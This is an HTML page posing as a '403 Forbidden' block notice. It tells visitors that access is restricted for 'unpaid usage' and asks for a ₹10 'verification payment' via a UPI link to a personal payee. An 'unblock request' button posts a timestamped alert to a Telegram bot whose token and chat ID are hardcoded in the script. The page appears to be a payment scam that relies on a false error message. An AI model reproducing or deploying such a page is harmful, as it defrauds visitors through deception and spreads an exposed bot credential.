<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Blocked</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
    }

    .warning-icon {
      font-size: 100px;
      color: red;
    }

    .blocked-text {
      font-size: 40px;
      color: red;
      margin: 20px 0;
    }

    .reason {
      font-size: 20px;
      color: red;
    }

    .upi {
      font-size: 18px;
      margin: 20px auto;
    }

    .upi a {
      display: inline-block;
      padding: 12px 24px;
      background-color: red;
      color: white;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
    }

    .upi a:hover {
      background-color: #cc0000;
    }

    .grey-text {
      color: grey;
      margin-top: 40px;
      font-size: 18px;
    }

    .button {
      margin-top: 15px;
      padding: 12px 24px;
      background-color: red;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s;
    }

    .button:disabled {
      background-color: grey;
      cursor: not-allowed;
    }

    .countdown {
      margin-top: 10px;
      color: grey;
      font-size: 14px;

.footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 5%;
      background: rgba(0, 0, 0, 0.5);
      color: white;
      font-size: 12px;
      text-align: center;
      line-height: 6vh;
      box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
      z-index: 5;
      transition: background 0.4s ease, transform 0.2s ease;  
       &:hover {
      background: rgba(0,0,0,0.7);
      transition: background 0.4s ease, transform 0.2s ease;  
}  
        
    }
  </style>
</head>
<body>

  <div class="warning-icon">&#9888;</div>

  <div class="blocked-text">Access Denied (403: Forbidden)</div>

  <div class="reason"> Access has been restricted due to unpaid usage. Please complete a minimal verification payment of â‚¹10 to unlock the page.</div>

  <div class="upi">
    <a href="upi://pay?pa=9752157775@fam&pn=Unlock%20Access&am=10&cu=INR">Pay now</a>
  </div>

  <div class="grey-text">Already paid? Click below to regenerate unblock request.</div>

  <button class="button" id="unblockBtn" onclick="handleClick()">Regenerate Unblock Request</button>
  <div class="countdown" id="countdown"></div>

  <script>
    const button = document.getElementById('unblockBtn');
    const countdownDiv = document.getElementById('countdown');
    const cooldown = 10 * 60 * 1000; // 5 minutes in ms
    const storageKey = 'unblockClickedAt';

    function sendTelegramMessage(message) {
      const botToken = "8078646648:AAHLu81vfP_A-FmU9bzTZnqOjYoNOR9H7-E";
      const chatId = "6192222544";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      return fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    function updateCountdown(msLeft) {
      const min = Math.floor(msLeft / 60000);
      const sec = Math.floor((msLeft % 60000) / 1000);
      countdownDiv.innerText = `Try again in ${min}m ${sec < 10 ? '0' + sec : sec}s`;
    }

    function startCountdown(msLeft) {
      button.disabled = true;
      updateCountdown(msLeft);

      const interval = setInterval(() => {
        msLeft -= 1000;
        if (msLeft <= 0) {
          clearInterval(interval);
          button.disabled = false;
          countdownDiv.innerText = '';
          localStorage.removeItem(storageKey);
        } else {
          updateCountdown(msLeft);
        }
      }, 1000);
    }

    function handleClick() {
      const now = Date.now();
      localStorage.setItem(storageKey, now.toString());

      button.disabled = true;
      startCountdown(cooldown);

      const message = `ALERTðŸš¨ Unblock request submitted at ${new Date(now).toLocaleString()}`;
      sendTelegramMessage(message);
      alert('Unblock request submitted.');
    }

    // On load: check localStorage for previous click
    window.onload = () => {
      const savedTime = localStorage.getItem(storageKey);
      if (savedTime) {
        const elapsed = Date.now() - parseInt(savedTime);
        if (elapsed < cooldown) {
          startCountdown(cooldown - elapsed);
        } else {
          localStorage.removeItem(storageKey);
        }
      }
    };
  </script>

</body>
</html>
